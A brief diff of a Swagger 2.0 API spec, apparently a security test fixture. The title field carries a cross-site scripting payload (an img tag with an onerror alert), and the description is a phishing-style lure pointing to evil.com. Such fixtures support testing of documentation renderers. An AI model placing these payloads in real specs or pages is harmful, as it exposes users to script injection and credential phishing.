@@ -1,7 +1,7 @@
 swagger: '2.0'
 info:
   version: 1.0.0
-  title: "<img src=x onerror=alert('XCYBOY')>"
+  title: <img src=x onerror=alert('XCYBOY')>
   description: Login to continue services below or go to https://evil.com
 
 paths:
